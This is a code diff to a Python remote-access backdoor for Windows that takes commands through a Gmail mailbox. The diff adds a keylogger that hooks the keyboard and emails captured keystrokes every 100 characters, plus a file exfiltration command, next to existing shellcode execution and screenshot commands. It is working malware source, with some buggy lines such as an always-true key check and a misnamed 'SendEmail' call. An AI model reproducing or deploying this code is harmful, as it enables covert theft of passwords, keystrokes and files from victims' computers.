@@ -17,6 +17,9 @@ import win32process
 import win32api
 import win32con
 import win32gui
+import logging
+import pythoncom
+import pyHook
 import win32security
 
 from PIL import ImageGrab
@@ -38,6 +41,12 @@ server_port = 587
 
 #Prints error messages and info to stdout
 verbose = True
+log_level = 20 
+
+if verbose is True:
+    log_level = 10
+
+logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 
 #generates a unique uuid 
 uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
@@ -65,6 +74,59 @@ class msgparser:
     def getDateHeader(self, msg_data):
         self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
+class keylogger(threading.Thread):
+
+    _instance = None
+
+    def __init__(self, jobid):
+
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.getkeys = True
+        self.key_buffer = ''
+
+        self.setDaemon(True)
+
+    @staticmethod
+    def getInstance(jobid):
+        if keylogger._instance is None:
+            keylogger._instance = keylogger(jobid)
+
+        return keylogger._instance
+
+    def run(self):
+        logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
+
+        while self.getkeys:
+            hm = pyHook.HookManager() 
+            hm.KeyDown = self.onKeyboardEvent 
+            hm.HookKeyboard() 
+            pythoncom.PumpMessages()
+
+    def stop(self):
+        logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
+
+        self.getkeys = False
+        self._instance = None
+        self.join()
+
+    def onKeyboardEvent(self, event):
+        char = chr(event.Ascii)
+        if event.Ascii != 0 or 8:
+            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            self.key_buffer += char
+        
+        if event.Ascii == 13:
+            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            self.key_buffer += char
+
+        if len(self.key_buffer) is 100:
+            logging.debug("[keylogger] Resetting key_buffer")
+            sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, jobid=self.jobid)
+            self.key_buffer = ''
+
+
+
 def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
 
@@ -78,8 +140,23 @@ def detectForgroundWindow():
     return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 def lockWorkstation(jobid):
-    ctypes.windll.user32.LockWorkStation()
-    sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=jobid)
+    try:
+        ctypes.windll.user32.LockWorkStation()
+        sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=jobid)
+    except Exception as e:
+        if verbose == True: print print_exc()
+
+def download(file, jobid):
+    if os.path.exists(file) == True:
+        try:
+            SendEmail('Downloaded file ' + str(file), file)
+        except Exception, e:
+            if verbose == True: print print_exc()
+            SendEmail('Download Failed: ' + str(e))
+            pass
+
+def upload(file, jobid):
+    raise NotImplementedError
 
 def screenshot(jobid):
     try:
@@ -135,42 +212,54 @@ def execCmd(command, jobid):
         if verbose == True: print_exc()
         pass
 
-def sendEmail(text, jobid='', attachment=[], checkin=False):
-    sub_header = uniqueid
-    if jobid:
-        sub_header = 'imp:{}:{}'.format(uniqueid,jobid)
-    elif checkin:
-        sub_header = 'checkin:{}'.format(uniqueid)
+class sendEmail(threading.Thread):
 
-    msg = MIMEMultipart()
-    msg['From'] = sub_header
-    msg['To'] = gmail_user
-    msg['Subject'] = sub_header
+    def __init__(self, text, jobid='', attachment=[], checkin=False):
+        
+        threading.Thread.__init__(self)
+        self.text = text
+        self.jobid = jobid
+        self.attachment = attachment
+        self.checkin = checkin
+        
+        self.setDaemon(True)
+        self.start()
 
-    message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': text}
-    msg.attach(MIMEText(str(message_content)))
-    
-    for attach in attachment:
-        if os.path.exists(attach) == True:  
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload(open(attach, 'rb').read())
-            Encoders.encode_base64(part)
-            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
-            msg.attach(part)
+    def run(self):
+        sub_header = uniqueid
+        if self.jobid:
+            sub_header = 'imp:{}:{}'.format(uniqueid, self.jobid)
+        elif self.checkin:
+            sub_header = 'checkin:{}'.format(uniqueid)
 
-    while True:
-        try:
-            mailServer = SMTP()
-            mailServer.connect(server, server_port)
-            mailServer.starttls()
-            mailServer.login(gmail_user,gmail_pwd)
-            mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
-            mailServer.quit()
-            break
-        except Exception as e:
-            if verbose == True: print_exc()
-            time.sleep(10)
+        msg = MIMEMultipart()
+        msg['From'] = sub_header
+        msg['To'] = gmail_user
+        msg['Subject'] = sub_header
 
+        message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': self.text}
+        msg.attach(MIMEText(str(message_content)))
+
+        for attach in self.attachment:
+            if os.path.exists(attach) == True:  
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(open(attach, 'rb').read())
+                Encoders.encode_base64(part)
+                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
+                msg.attach(part)
+
+        while True:
+            try:
+                mailServer = SMTP()
+                mailServer.connect(server, server_port)
+                mailServer.starttls()
+                mailServer.login(gmail_user,gmail_pwd)
+                mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
+                mailServer.quit()
+                break
+            except Exception as e:
+                if verbose == True: print_exc()
+                time.sleep(10)
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
@@ -194,10 +283,13 @@ def checkJobs():
                     jobid = msg.subject.split(':')[2]
                     
                     if msg.dict:
+                        t = None
                         cmd = msg.dict['CMD'].lower()
                         arg = msg.dict['ARG']
 
-                        if cmd == 'execshellcode': 
+                        logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
+
+                        if cmd == 'execshellcode':
                             t = threading.Thread(name='execshell', target=execShellcode, args=(arg,jobid))
                         
                         elif cmd == 'download':
@@ -212,21 +304,28 @@ def checkJobs():
                         elif cmd == 'lockscreen':
                             t = threading.Thread(name='lockWorkstation', target=lockWorkstation, args=(jobid,))
 
+                        elif cmd == 'startkeylogger':
+                            keylogger.getInstance(jobid).start()
+
+                        elif cmd == 'stopkeylogger':
+                            keylogger.getInstance(jobid).stop()
+
                         elif cmd == 'forcecheckin':
-                            sendEmail("Host checking in", checkin=True)
+                            sendEmail("Host checking in as requested", checkin=True)
 
                         else:
                             raise NotImplementedError
 
-                        t.setDaemon(True)
-                        t.start()
+                        if t:
+                            t.setDaemon(True)
+                            t.start()
 
             c.logout()
 
             time.sleep(10)
         
         except Exception as e:
-            if verbose == True: print_exc()
+            logging.debug(print_exc())
             time.sleep(10)
 
 if __name__ == '__main__':
